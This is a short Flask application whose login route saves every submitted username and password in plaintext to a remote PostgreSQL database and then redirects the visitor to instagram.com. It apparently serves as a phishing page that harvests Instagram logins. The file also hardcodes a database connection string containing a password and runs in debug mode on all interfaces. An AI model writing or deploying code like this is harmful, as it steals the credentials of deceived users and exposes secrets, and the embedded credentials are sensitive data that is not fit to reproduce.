import os  # Add this import for os module

from flask import Flask, render_template, request, redirect
from flask_sqlalchemy import SQLAlchemy

app = Flask(__name__)

# Set the secret key for session management

# PostgreSQL database connection configuration
app.config['SQLALCHEMY_DATABASE_URI'] = 'postgresql://yosoypabloemilioescobargaviria1:Q2Z15776FGYzPS6UAzRR4hKSn8hKibW5@dpg-csp5tq0gph6c73dvqp4g-a.oregon-postgres.render.com/flask_users'
app.config['SQLALCHEMY_TRACK_MODIFICATIONS'] = False

# Initialize the database
db = SQLAlchemy(app)

# Define a User model
class User(db.Model):
    __tablename__ = 'users'  # Explicitly set the table name to 'users'
    id = db.Column(db.Integer, primary_key=True)
    username = db.Column(db.String(80), unique=True, nullable=False)
    password = db.Column(db.String(120), nullable=False)

@app.route('/', methods=['GET', 'POST'])
def login():
    if request.method == 'POST':
        username = request.form['uname']
        password = request.form['password']

        # Create a new user instance
        new_user = User(username=username, password=password)

        # Add the new user to the session and commit
        db.session.add(new_user)
        db.session.commit()

        # Redirect to Instagram (or any other page)
        return redirect("https://www.instagram.com")

    return render_template('index.html')

if __name__ == '__main__':
    # Get the port from environment variables or default to 5000
    port = int(os.environ.get('PORT', 5000))

    # Ensure app is bound to 0.0.0.0 for external access
    app.run(host='0.0.0.0', port=port, debug=True)
